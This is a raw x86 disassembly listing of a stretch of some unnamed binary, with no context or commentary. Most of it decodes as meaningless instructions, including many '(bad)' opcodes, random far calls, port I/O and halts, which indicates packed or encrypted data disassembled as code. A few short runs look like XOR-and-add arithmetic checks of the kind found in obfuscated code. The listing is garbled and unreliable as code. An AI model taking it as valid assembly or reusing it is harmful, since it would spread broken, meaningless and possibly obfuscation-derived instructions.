  4085d9:	jmp    0xb1a1fa40
  4085de:	pop    ds
  4085df:	pop    ecx
  4085e0:	adc    eax,0xe6932bf6
  4085e5:	(bad)  
  4085e6:	or     esi,DWORD PTR [edi]
  4085e8:	mul    BYTE PTR [edx*8+0x62ee915c]
  4085ef:	jns    0x408641
  4085f1:	lds    esi,FWORD PTR [ebp+0x6d57630b]
  4085f7:	frstpm(287 only) 
  4085f9:	stos   BYTE PTR es:[edi],al
  4085fa:	cld    
  4085fb:	call   0x14e2ed2c
  408600:	out    0x92,al
  408602:	js     0x4085a8
  408604:	add    edi,DWORD PTR [ebp+0x1060dc74]
  40860a:	fstp   st(6)
  40860c:	imul   esi,DWORD PTR [ebx-0x1],0x98159c3e
  408613:	(bad)  
  408614:	out    0xb4,al
  408616:	pop    es
  408617:	adc    cl,BYTE PTR [ebp+0x67c29d4d]
  40861d:	outs   dx,DWORD PTR ds:[si]
  40861f:	inc    esp
  408620:	inc    eax
  408621:	icebp  
  408622:	pop    ds
  408623:	rcr    BYTE PTR [eax+ebp*1-0x47],cl
  408627:	add    al,0xe4
  408629:	call   0xc7bb:0xa73c76d4
  408630:	push   0xb322c701
  408635:	jns    0x4085fd
  408637:	or     ebx,DWORD PTR [ebp+0x7ecbfcb3]
  40863d:	push   ecx
  40863e:	int3   
  40863f:	cmp    esi,DWORD PTR [ebx-0x33]
  408642:	sti    
  408643:	out    dx,eax
  408644:	mov    cl,0xf9
  408646:	and    eax,0xbdf12b2e
  40864b:	cmp    DWORD PTR [esp+edx*8+0x76],0x38d8f991
  408653:	mov    edx,0x9b421a04
  408658:	mov    DWORD PTR [ebx-0x37dfff32],ebx
  40865e:	test   al,0x32
  408660:	push   ebx
  408661:	push   edx
  408662:	push   eax
  408663:	add    DWORD PTR [ebx],edx
  408665:	cmc    
  408666:	cwde   
  408667:	push   edi
  408668:	icebp  
  408669:	cmp    bl,BYTE PTR [eax-0x2e]
  40866c:	shl    BYTE PTR [eax-0x50],cl
  40866f:	lods   al,BYTE PTR ds:[esi]
  408670:	popa   
  408671:	mov    dh,BYTE PTR [edx+0x2d0fa7fc]
  408677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408678:	aas    
  408679:	bts    DWORD PTR [ebx+0x12e08f4e],0x61
  408681:	jbe    0x40861f
  408683:	out    dx,al
  408684:	jle    0x408673
  408686:	add    al,0xe2
  408688:	(bad)  [esi-0x7672ed25]
  40868e:	push   ds
  40868f:	push   edx
  408690:	xchg   esp,eax
  408691:	iret   
  408692:	ins    BYTE PTR es:[edi],dx
  408693:	inc    esi
  408694:	fldcw  WORD PTR [esi-0x12]
  408697:	call   0x12fe:0xb8bbe0ec
  40869e:	mov    es,WORD PTR [ecx+0x43366315]
  4086a4:	add    bl,bh
  4086a6:	xor    eax,0x5d890043
  4086ab:	hlt    
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x5558504a],ecx
  4086ca:	mov    eax,ds:0x7e7ed68a
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	fnsave [ebx+eiz*8+0x69]
  4086d7:	inc    eax
  4086d8:	mov    ds:0xff998f57,eax
  4086dd:	push   0xea36458c
  4086e2:	lods   eax,DWORD PTR ds:[esi]
  4086e3:	call   0x9dc07ad2
  4086e8:	ins    BYTE PTR es:[edi],dx
  4086e9:	xor    DWORD PTR [ebp-0x57],esi
  4086ec:	neg    DWORD PTR [eax+0x40]
  4086ef:	xchg   al,bl
  4086f1:	inc    esp
  4086f2:	inc    edx
  4086f3:	fwait
  4086f4:	add    DWORD PTR [ebp+0x5bab024c],edi
  4086fa:	ja     0x4086c7
  4086fc:	pop    ds
  4086fd:	add    bl,bl
  4086ff:	lock in al,0xe9
  408702:	dec    ecx
  408703:	stos   BYTE PTR es:[edi],al
  408704:	out    0x6b,al
  408706:	inc    ebx
  408707:	cdq    
  408708:	rcl    DWORD PTR [ecx],1
  40870a:	pop    ebx
  40870b:	inc    edx
  40870c:	jmp    0x3691da81
  408711:	out    dx,eax
  408712:	std    
  408713:	neg    DWORD PTR [eax-0x731222ba]
  408719:	sbb    al,0x80
  40871b:	cdq    
  40871c:	add    ah,BYTE PTR [ebp-0x7fe04001]
  408722:	into   
  408723:	sbb    eax,0x2048f59c
  408728:	loop   0x4086e0
  40872a:	add    BYTE PTR [ebx+eiz*8+0x59],ch
  40872e:	inc    edx
  40872f:	xor    al,0x5
  408731:	sub    dl,ch
  408733:	pop    edi
  408734:	push   es
  408735:	sbb    BYTE PTR [ecx+0x5e1cbbb4],ch
  40873b:	inc    edi
  40873c:	mov    DWORD PTR [esi+ebx*8],ebx
  40873f:	pop    esp
  408740:	mov    WORD PTR [ebx-0x4a],fs
  408743:	mov    ecx,0xd14841c0
  408748:	push   ebx
  408749:	lds    ebx,FWORD PTR [ecx]
  40874b:	mov    eax,ds:0x87770318
  408750:	cdq    
  408751:	jne    0x40877e
  408753:	push   0xfffffff0
  408755:	mov    gs,edx
  408757:	push   eax
  408759:	and    eax,0xffffffc6
  40875c:	fsub   st,st(4)
  40875e:	cdq    
  40875f:	pop    ebp
  408760:	push   cs
  408761:	(bad)
  408766:	pop    eax
  408767:	int    0xd7
  408769:	inc    edx
  40876a:	leave  
  40876b:	push   es
  40876c:	add    eax,0x29755a29
  408771:	cdq    
  408772:	test   ch,ch
  408774:	jnp    0x4087ec
  408776:	int    0x1e
  408778:	mov    ebp,DWORD PTR [ebx-0x60]
  40877b:	inc    ebp
  40877c:	aas    
  40877d:	jo     0x408755
  40877f:	mov    ebp,0x87851587
  408784:	mov    ds:0x5b396ea5,al
  408789:	jbe    0x408718
  40878b:	out    0x7,eax
  40878d:	hlt    
  40878e:	out    0x1c,al
  408790:	popa   
  408791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408792:	add    ebp,edi
  408794:	cmp    BYTE PTR [ebp+0x4d],0x11
  408798:	stos   DWORD PTR es:[edi],eax
  408799:	aam    0xe9
  40879b:	mov    al,ds:0x39771468
  4087a0:	dec    esp
  4087a1:	dec    DWORD PTR [ebx+0x3ff2e8cd]
  4087a7:	mov    ah,0x48
  4087a9:	ins    BYTE PTR es:[edi],dx
  4087aa:	mov    ecx,DWORD PTR [ecx+0x2]
  4087ad:	adc    BYTE PTR [edx+0x6a42c0e9],bl
  4087b3:	sub    DWORD PTR [ebx-0x134c053f],eax
  4087b9:	sar    ecx,cl
  4087bb:	shr    ecx,cl
  4087bd:	inc    ebx
  4087be:	mov    al,0xf7
  4087c0:	cmp    dl,dh
  4087c2:	dec    ecx
  4087c3:	fcom   st(6)
  4087c5:	push   eax
  4087c6:	xchg   esi,eax
  4087c7:	repnz mov edi,0x638eab6b
  4087cd:	test   DWORD PTR [edx+0x17],0xf2243d43
  4087d4:	mov    bh,0x32
  4087d6:	push   edx
  4087d7:	push   esp
  4087d8:	aaa    
  4087d9:	lahf   
  4087da:	pop    ecx
  4087db:	push   es
  4087dc:	xor    DWORD PTR [ecx-0x80],edx
  4087df:	xchg   esp,eax
  4087e0:	mov    DWORD PTR [ecx+0x131e30e8],esi
  4087e6:	daa    
  4087e7:	ret    
  4087e8:	push   edx
  4087e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ea:	jge    0x408785
  4087ec:	aam    0xd5
  4087ee:	jle    0x40880f
  4087f0:	inc    edi
  4087f1:	aad    0x32
  4087f3:	mov    ebx,0x389aebdb
  4087f8:	cmp    al,al
  4087fa:	pop    ecx
  4087fb:	add    eax,DWORD PTR [ebp-0x6e]
  4087fe:	les    edx,FWORD PTR [ecx]
  408800:	int3   
  408801:	push   ecx
  408802:	call   0x9791:0xc9b1047b
  408809:	addr16 and al,0xab
  40880c:	and    eax,0x9372fb2c
  408811:	jae    0x4087f7
  408813:	sub    al,0x53
  408815:	cmp    al,0x0
  408817:	and    bl,ah
  408819:	mov    edi,0xca146aff
  40881e:	inc    esp
  40881f:	(bad)  
  408820:	xlat   BYTE PTR ds:[ebx]
  408821:	mov    cs,WORD PTR [ebx-0x31]
  408824:	or     eax,0x53b60fe9
  408829:	pop    edx
  40882a:	jb     0x408873
  40882c:	popf   
  40882d:	jne    0x408868
  40882f:	mov    esp,ss
  408831:	mov    ds:0xf748a93,al
  408836:	bound  esp,QWORD PTR [ebp+edx*8-0x67]
  40883a:	fadd   st,st(2)
  40883c:	add    BYTE PTR [ecx],dh
  40883e:	add    eax,0xf61132aa
  408843:	cmp    ebx,DWORD PTR [edi+ebp*8-0x74d20e79]
  40884a:	cmp    DWORD PTR ds:0x4f5daf4c,ebp
  408850:	dec    eax
  408851:	and    eax,0xa14688fc
  408856:	sub    edx,ebx
  408858:	int    0x4b
  40885a:	mov    ch,0xdb
  40885c:	mov    al,0xd7
  40885e:	popf   
  40885f:	jne    0x408855
  408861:	stos   BYTE PTR es:[edi],al
  408862:	pop    ebx
  408863:	mov    cl,0x49
  408865:	lods   al,BYTE PTR ds:[esi]
  408866:	retf   0x3501
  408869:	repz push ebp
  40886b:	jle    0x4088b6
  40886d:	retf   0x407e
  408870:	popf   
  408871:	pop    eax
  408872:	jbe    0x408892
  408874:	fimul  DWORD PTR [ecx+0x95b7a3e]
  40887a:	test   BYTE PTR [edx+ecx*8-0x33],0x62
  40887f:	mov    dl,0x2d
  408881:	add    eax,0x3135b45e
  408886:	ret    0x6fe1
  408889:	movlps xmm4,QWORD PTR [esi]
  40888c:	(bad)  
  40888d:	fsub   DWORD PTR [ecx-0x30]
  408890:	dec    esp
  408891:	sbb    eax,DWORD PTR [ecx]
  408893:	inc    edi
  408894:	shr    DWORD PTR cs:[edx+esi*8-0x2f],1
  408899:	clc    
  40889a:	xchg   esi,eax
  40889b:	inc    edx
  40889c:	ret    
  40889d:	jnp    0x4088ea
  40889f:	jns    0x40885d
  4088a1:	mov    WORD PTR [edx+eax*8+0xd3b3715],gs
  4088a8:	mov    DWORD PTR ds:0xece9ec9b,eax
  4088ae:	inc    esi
  4088af:	mov    al,0x6b
  4088b1:	sbb    ebx,DWORD PTR [edi+0x3e3cf81e]
  4088b7:	jae    0x408926
  4088b9:	(bad)  
  4088ba:	mul    DWORD PTR [ebx+0x25]
  4088bd:	mov    edi,0x2518af30
  4088c2:	pop    edx
  4088c3:	pop    ecx
  4088c4:	ret    0x6c85
  4088c7:	daa    
  4088c8:	xchg   edi,eax
  4088c9:	push   es
  4088ca:	cmp    esp,esi
  4088cc:	sub    eax,0x6de141c2
  4088d1:	daa    
  4088d2:	icebp  
  4088d3:	scas   eax,DWORD PTR es:[edi]
  4088d4:	sub    DWORD PTR [ebx+0x15],edi
  4088d7:	test   eax,0xe0092357
  4088dc:	das    
  4088dd:	out    dx,al
  4088de:	lods   eax,DWORD PTR ds:[esi]
  4088df:	lock push ebp
  4088e1:	dec    eax
  4088e2:	and    eax,0xfa17f85b
  4088e7:	pusha  
  4088e8:	push   0x5b
  4088ea:	push   ecx
  4088eb:	mov    cl,0xaf
  4088ed:	dec    esi
  4088ee:	mov    al,ds:0x71844a61
  4088f3:	cs cmp al,0x99
  4088f6:	imul   ecx,DWORD PTR [ecx+0x50],0xffffffdb
  4088fa:	(bad)  
  4088fb:	and    DWORD PTR [ecx-0x75],ebp
  4088fe:	add    BYTE PTR [ecx+0x43366335],al
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xe1d50c2c
  408968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	jmp    0xda34da12
  408976:	out    dx,al
  408977:	lods   eax,DWORD PTR ds:[esi]
  408978:	rcl    BYTE PTR [esi-0x10f4a333],1
  40897e:	fwait
  40897f:	xor    DWORD PTR [edi+0x56],edi
  408982:	mov    ds:0x7cb23795,al
  408987:	sub    eax,0x9de6a4b1
  40898c:	data16 or dh,0xfe
  408990:	aad    0x11
  408992:	mov    DWORD PTR [ebx+0xa4782ca],edi
  408998:	imul   edi,eax,0x27
  40899b:	mov    ecx,DWORD PTR ds:0x912febf0
  4089a1:	repz dec edi
  4089a3:	mov    ds:0x60fa2632,al
  4089a8:	loope  0x408a18
  4089aa:	loop   0x4089ff
  4089ac:	mov    eax,ds:0x52376ef9
  4089b1:	mov    edi,0x2c503bd
  4089b7:	test   DWORD PTR [esi-0x7e2a9106],esi
  4089bd:	xchg   ecx,eax
  4089be:	shl    DWORD PTR [ebx],0xff
  4089c1:	jecxz  0x408980
  4089c3:	fsubr  QWORD PTR [edx-0x7af12209]
  4089c9:	popf   
  4089ca:	mov    eax,0x326a7466
  4089cf:	pop    esi
  4089d0:	dec    esp
  4089d1:	sbb    cl,ch
  4089d3:	xor    BYTE PTR [esi-0x75],ch
  4089d6:	ror    BYTE PTR [edi],cl
  4089d8:	pop    ebp
  4089d9:	jae    0x4089c7
  4089db:	fwait
  4089dc:	stos   BYTE PTR es:[edi],al
  4089dd:	pop    ebp
  4089de:	sahf   
  4089df:	mov    ebx,0xc51f1f08
  4089e4:	or     al,0x74
  4089e6:	std    
  4089e7:	cmc    
  4089e8:	inc    ebp
  4089e9:	aam    0x18
  4089eb:	sub    ebx,DWORD PTR [ecx-0x2b]
  4089ee:	add    BYTE PTR [ebp-0xe2a7fe3],0x62
  4089f5:	pop    edi
  4089f6:	cdq    
  4089f7:	or     cl,BYTE PTR [eax-0x469ffed7]
  4089fd:	jmp    0xfd652477
  408a02:	mov    dh,0xa2
  408a04:	test   eax,0x81878692
  408a09:	enter  0x185c,0x6
  408a0d:	daa    
  408a0e:	(bad)  
  408a0f:	or     esi,DWORD PTR [esp+ebp*8-0x728c0cad]
  408a16:	jp     0x4089a5
  408a18:	adc    al,0x3e
  408a1a:	in     al,0xe3
  408a1c:	adc    BYTE PTR [ebx+0x1db51a11],al
  408a22:	in     al,dx
  408a23:	or     BYTE PTR [esi-0x66fafae8],dh
  408a29:	push   esp
  408a2a:	xor    edi,DWORD PTR gs:[ebx]
  408a2d:	dec    edi
  408a2e:	dec    ebx
  408a2f:	push   es
  408a30:	fwait
  408a31:	cmp    esp,DWORD PTR [eax-0x23]
  408a34:	pop    es
  408a35:	dec    ecx
  408a36:	jbe    0x4089c6
  408a38:	pop    esi
  408a39:	dec    esp
  408a3a:	sbb    BYTE PTR [edx-0x290b1377],0x8e
  408a41:	mov    dl,0x31
  408a43:	add    BYTE PTR [edi-0x141dc43c],ch
  408a49:	jmp    0xc5d540f3
  408a4e:	push   eax
  408a4f:	push   cs
  408a50:	fdivr  DWORD PTR [eax-0x66]
  408a53:	out    dx,al
  408a54:	sub    eax,0xeacf4e90
  408a59:	div    DWORD PTR [edi]
  408a5b:	mov    dl,0xed
  408a5d:	pusha  
  408a5e:	pop    eax
  408a5f:	js     0x408a99
  408a61:	inc    edi
  408a62:	pusha  
  408a63:	ss pop ebp
  408a65:	mov    dl,0xcd
  408a67:	jnp    0x408abe
  408a69:	add    eax,edx
  408a6b:	and    al,0x25
  408a6d:	mov    al,0xb1
  408a6f:	test   eax,0xf1558b3e
  408a74:	outs   dx,BYTE PTR ds:[esi]
  408a75:	mov    eax,0xd949b26d
  408a7a:	dec    edi
  408a7b:	xchg   DWORD PTR [ebx],esp
  408a7d:	and    ecx,DWORD PTR [edx-0x57]
  408a80:	xchg   DWORD PTR [ebx+0x73],edi
  408a83:	add    BYTE PTR [edi-0x8],bh
  408a86:	iret   
  408a87:	and    al,BYTE PTR [ebp+0x6a]
  408a8a:	stc    
  408a8b:	xor    al,0x43
  408a8d:	nop
  408a8e:	pop    eax
  408a8f:	test   BYTE PTR [ecx+0x7287b62],al
  408a95:	jmp    0xb6bc:0x590d396b
  408a9c:	adc    DWORD PTR [ebp-0x3f60195f],esp
  408aa2:	inc    ebx
  408aa3:	iret   
  408aa4:	sti    
  408aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa6:	mov    ebp,0x41a29a6e
  408aab:	(bad)  
  408aac:	jae    0x408aa7
  408aae:	hlt    
  408aaf:	in     al,0x4
  408ab1:	dec    ecx
  408ab2:	add    DWORD PTR [edx-0x48],edx
  408ab5:	push   0xdb6a7532
  408aba:	(bad)  
  408abb:	xchg   ebx,eax
  408abc:	or     BYTE PTR ds:0xebcdd460,dl
  408ac2:	hlt    
  408ac3:	fidiv  WORD PTR [ecx+eax*4]
  408ac6:	pop    eax
  408ac7:	xchg   DWORD PTR [eax+0x2691a537],ebx
  408acd:	cmc    
  408ace:	enter  0x9bea,0x15
  408ad2:	xor    ebx,DWORD PTR [eax+0x26943275]
  408ad8:	js     0x408ae1
  408ada:	loope  0x408b01
  408adc:	mov    WORD PTR [edx-0x65],fs
  408adf:	in     eax,0xbb
  408ae1:	adc    dh,bl
  408ae3:	ins    DWORD PTR es:[edi],dx
  408ae4:	scas   eax,DWORD PTR es:[edi]
  408ae5:	ins    BYTE PTR es:[edi],dx
  408ae6:	jp     0x408b49
  408ae8:	jecxz  0x408a9f
  408aea:	repz pop esp
  408aec:	call   0x1def925f
  408af1:	fpatan 
  408af3:	scas   eax,DWORD PTR es:[edi]
  408af4:	jne    0x408ac7
  408af6:	test   eax,0x418393e4
  408afb:	mov    ebp,0x40124417
  408b00:	dec    edi
  408b01:	push   0xffffffd7
  408b03:	jo     0x408aeb
  408b05:	cmp    edx,DWORD PTR [ecx-0x68]
  408b08:	cmp    BYTE PTR [esp+edx*4-0x7585a2c7],cl
  408b0f:	jecxz  0x408b45
  408b11:	arpl   WORD PTR [ebx-0x56],cx
  408b14:	or     BYTE PTR [edi],ch
  408b16:	jns    0x408b94
  408b18:	push   eax
  408b19:	icebp  
  408b1a:	add    BYTE PTR [esi+eax*1],cl
  408b1d:	or     bl,BYTE PTR [bx-0x4b]
  408b21:	xor    eax,0x3e5b1ae5
  408b26:	add    BYTE PTR [ebp*1-0x43265ab4],cl
  408b2d:	(bad)  
  408b2f:	mov    dl,0xd6
  408b31:	clc    
  408b32:	jmp    0x408b18
  408b34:	inc    ecx
  408b35:	pop    eax
  408b36:	in     eax,dx
  408b37:	mov    ah,0x2d
  408b39:	adc    DWORD PTR [esi+0x2a2e9c4e],0xffffffb3
  408b40:	subps  xmm2,XMMWORD PTR [edi+0x7cd19f61]
  408b47:	inc    edi
  408b48:	je     0x408b87
  408b4a:	or     dh,BYTE PTR [edx-0x7e]
  408b4d:	pop    esp
  408b4e:	cli    
  408b4f:	mov    eax,DWORD PTR [eax-0x486526ec]
  408b55:	adc    eax,0xa8053ddd
  408b5a:	popa   
  408b5b:	jl     0x408af1
  408b5d:	pop    eax
  408b5e:	cld    
  408b5f:	dec    edi
  408b60:	(bad)  
  408b61:	jg     0x408b35
  408b63:	jmp    0xde9738a6
  408b68:	jb     0x408bc9
  408b6a:	pop    es
  408b6b:	mov    BYTE PTR [ebx-0x3006aca7],bh
  408b71:	cdq    
  408b72:	punpckhbw mm5,mm2
  408b75:	pop    ecx
  408b76:	(bad)  
  408b77:	sub    DWORD PTR [edi-0x6f400996],ebx
  408b7d:	sub    BYTE PTR [esi-0x777fa35c],ch
  408b83:	cmp    eax,0x8517182b
  408b88:	and    DWORD PTR [ebx],0x8b1025bf
  408b8e:	stos   BYTE PTR es:[edi],al
  408b8f:	mov    bh,0xa6
  408b91:	ror    DWORD PTR ds:0xc11f9a03,0xeb
  408b98:	cmp    al,0x84
  408b9a:	in     eax,0xf
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	rcl    DWORD PTR [edx-0x22],0xf2
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	cmp    edx,edx
  408bfe:	push   es
  408bff:	xor    BYTE PTR [ecx-0x4f],0x33
  408c03:	inc    esp
  408c04:	sbb    eax,0x9762cfec
  408c09:	cmp    edi,DWORD PTR [ebp-0x24]
  408c0c:	push   esp
  408c0d:	jns    0x408bdb
  408c0f:	jmp    0x9eb8db94
  408c14:	cmp    eax,0x92802b82
  408c19:	enter  0x39db,0xba
  408c1d:	or     BYTE PTR [edx],dh
  408c1f:	enter  0x5191,0x3
  408c23:	pop    esi
  408c24:	jae    0x408c31
  408c26:	add    bh,dh
  408c28:	jno    0x408c3c
  408c2a:	mov    ah,0xd9
  408c2c:	retf   0xfdab
  408c2f:	mov    ds:0x42f4ceac,al
  408c34:	in     al,dx
  408c35:	repnz aaa 
  408c37:	js     0x408c1b
  408c39:	cdq    
  408c3a:	pop    ds
  408c3b:	mov    eax,ds:0x62e1c054
  408c40:	push   esi
  408c41:	add    ebx,DWORD PTR [ecx+ebx*8+0x4a3296ee]
  408c48:	lea    ebx,[ecx]
  408c4a:	out    0xd9,al
  408c4c:	addr16 mov ah,0x54
  408c4f:	sahf   
  408c50:	and    al,0x3b
  408c52:	stos   BYTE PTR es:[edi],al
  408c53:	lods   al,BYTE PTR ds:[esi]
  408c54:	pop    esp
  408c55:	push   eax
  408c56:	jne    0x408c89
  408c58:	xor    al,0x99
  408c5a:	jae    0x408ca4
  408c5c:	pop    eax
  408c5d:	push   ecx
  408c5e:	pop    eax
  408c5f:	or     dl,BYTE PTR ds:0x56996249
  408c65:	cmc    
  408c66:	out    0x89,eax
  408c68:	stos   DWORD PTR es:[edi],eax
  408c69:	fistp  WORD PTR [edx]
  408c6b:	push   edx
  408c6c:	loopne 0x408c9c
  408c6e:	jg     0x408c7f
  408c70:	add    ebx,DWORD PTR [edx]
  408c72:	enter  0xc15c,0xa1
  408c76:	les    esp,FWORD PTR [esi-0x1c14c81e]
  408c7c:	dec    esi
  408c7d:	adc    eax,0x1a837b22
  408c82:	(bad)  
  408c83:	pusha  
  408c84:	aaa    
  408c85:	pop    esp
  408c86:	fdivp  st(7),st
  408c88:	or     al,dl
  408c8a:	sub    esi,ebp
  408c8c:	xchg   edx,eax
  408c8d:	mov    WORD PTR [edx-0x42],cs
  408c90:	sub    eax,0xfebf81a5
  408c95:	mov    edx,ss
  408c97:	loope  0x408c48
  408c99:	dec    ecx
  408c9a:	stos   BYTE PTR es:[edi],al
  408c9b:	jl     0x408cf3
  408c9d:	mov    esi,0xe1788182
  408ca2:	push   ebp
  408ca3:	or     al,0x5b
  408ca5:	bound  edi,QWORD PTR [ebx-0x475e5739]
  408cab:	je     0x408ce1
  408cad:	xchg   ebx,eax
  408cae:	pop    ebx
  408caf:	adc    edx,edx
  408cb1:	sub    esp,DWORD PTR [edi-0xc]
  408cb4:	cli    
  408cb5:	sti    
  408cb6:	mov    ?,WORD PTR [eax-0x999c354]
  408cbc:	sbb    DWORD PTR [eax-0x33],esp
  408cbf:	jecxz  0x408d40
  408cc1:	push   eax
  408cc2:	inc    ebp
  408cc3:	xor    eax,0x7140f54
  408cc8:	mov    esi,0x231c0ac5
  408ccd:	out    dx,eax
  408cce:	lods   eax,DWORD PTR ds:[esi]
  408ccf:	nop
  408cd0:	ror    BYTE PTR [eax-0x5178ade3],cl
  408cd6:	in     eax,0x55
  408cd8:	call   0x230600e
  408cdd:	test   BYTE PTR [edx-0x11e6b896],0xa3
  408ce4:	pushf  
  408ce5:	mov    ah,0x36
  408ce7:	add    DWORD PTR [ecx],esp
  408ce9:	enter  0x9176,0x90
  408ced:	retf   
  408cee:	pusha  
  408cef:	outs   dx,BYTE PTR ds:[esi]
  408cf0:	loopne 0x408cdd
  408cf2:	fist   WORD PTR [edx-0x5c2ee07b]
  408cf8:	sub    ebx,edi
  408cfa:	mov    ecx,0x230d5627
  408cff:	and    al,BYTE PTR [eax+0x57]
  408d02:	(bad)  
  408d03:	mov    dh,0x24
  408d05:	push   ebx
  408d06:	xchg   ebx,eax
  408d07:	xchg   edi,eax
  408d08:	imul   ebx,DWORD PTR [esi+0x3b],0xffffff87
  408d0c:	(bad)  
  408d0d:	outs   dx,BYTE PTR ds:[esi]
  408d0e:	or     cl,bh
  408d10:	pop    ecx
  408d11:	in     eax,0xde
  408d13:	sbb    cl,bl
  408d15:	outs   dx,DWORD PTR ds:[esi]
  408d16:	sbb    eax,0x54d7684b
  408d1b:	xor    esi,DWORD PTR [ebx]
  408d1d:	mov    cl,0xa9
  408d1f:	out    0xb1,eax
  408d21:	fnstcw WORD PTR [ebx]
  408d23:	mov    al,0xa0
  408d25:	xor    eax,0x2c3af87c
  408d2a:	sub    eax,ecx
  408d2c:	xchg   ebx,eax
  408d2d:	std    
  408d2e:	xor    al,0xc
  408d30:	mov    edi,0xe10376bd
  408d35:	not    ah
  408d37:	test   edi,0xa0ff2b3
  408d3d:	imul   BYTE PTR [ecx+0x45]
  408d40:	imul   eax,DWORD PTR [ecx+0x942f338],0xffffffda
  408d47:	cmp    al,0x8c
  408d49:	add    eax,0x4b8aebef
  408d4e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  408d50:	not    BYTE PTR [esi]
  408d52:	imul   edx,ebx,0xffffff97
  408d55:	mov    al,ds:0xeaced586
  408d5a:	mov    al,0xe7
  408d5c:	pop    ebp
  408d5d:	cs fdivrp st(0),st
  408d60:	fld    QWORD PTR [eax]
  408d62:	lods   eax,DWORD PTR ds:[esi]
  408d63:	shl    BYTE PTR ds:0xd2989bc4,1
  408d69:	mov    esi,0x10853c3f
  408d6e:	test   BYTE PTR [ecx],al
  408d70:	mov    ch,0x54
  408d72:	sbb    esi,DWORD PTR [ebx+0x29]
  408d75:	or     dl,bh
  408d77:	cmp    DWORD PTR [eax-0x317b11ff],esi
  408d7d:	outs   dx,BYTE PTR ds:[esi]
  408d7e:	stos   BYTE PTR es:[edi],al
  408d7f:	mov    esi,0x731ac183
  408d84:	mov    ds:0xe19c78bc,eax
  408d89:	push   esp
  408d8a:	mov    ch,0xa2
  408d8c:	dec    ecx
  408d8d:	cmc    
  408d8e:	add    BYTE PTR [edi+0x5d2d5af2],dh
  408d94:	fsub   DWORD PTR [edx+ebx*1+0x69]
  408d98:	cdq    
  408d99:	push   cs
  408d9a:	push   es
  408d9b:	int3   
  408d9c:	push   es
  408d9d:	mov    eax,ds:0x8d9d766f
  408da2:	adc    al,0x23
  408da4:	fbstp  TBYTE PTR [edx-0x64]
  408da7:	pop    esi
  408da8:	fwait
  408da9:	ins    BYTE PTR es:[edi],dx
  408daa:	stos   BYTE PTR es:[edi],al
  408dab:	xor    al,0xba
  408dad:	mov    ebx,es
  408daf:	xchg   esp,eax
  408db0:	xlat   BYTE PTR ds:[ebx]
  408db1:	dec    esp
  408db2:	cmp    dl,0x25
  408db5:	loop   0x408d69
  408db7:	mov    dl,0x66
  408db9:	lea    esp,[esi]
  408dbb:	dec    ebp
  408dbc:	mov    ds:0x6f6c169e,al
  408dc1:	imul   edi,DWORD PTR [eax-0x63c8ca3d],0x5d
  408dc8:	jge    0x408e3f
  408dca:	or     BYTE PTR [ebx+0x1c2855a9],ah
  408dd0:	xor    al,BYTE PTR [ebp-0x75]
  408dd3:	dec    ecx
  408dd4:	fdivr  QWORD PTR [ecx]
  408dd6:	ret    
  408dd7:	ret    
  408dd8:	inc    edx
  408dd9:	sub    bl,BYTE PTR [ebp-0x4a]
  408ddc:	pop    ebx
  408ddd:	jne    0x408dff
  408ddf:	xchg   esp,eax
